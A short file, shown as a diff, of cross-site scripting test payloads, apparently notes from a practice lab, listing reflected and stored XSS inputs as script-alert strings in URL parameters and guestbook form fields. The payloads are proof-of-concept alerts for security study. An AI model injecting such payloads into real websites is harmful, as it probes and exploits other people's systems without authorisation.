@@ -1,0 +1,13 @@
+XSS - reflected
+?name=<script>alert(%27XSS!%27)</script>
+?name=<script>alert('XSS!')</script>&&sumbit=submit
+
+XSS - reflected - Field input
+<script>alert('Reflected XSS!')</script>
+
+XSS - Stored
+
+<script>alert(' Stored XSS!')</script>
+?txtName=nothing&mtxMessage=<script>alert(%27XSS!%27)</script>&btnSign=Sign+Guestbook
+
+<script>alert(%27XSS!%27)</script>txtName=nothing&mtxMessage=<script>alert(%27XSS!%27)</script>&btnSign=Sign+Guestbook
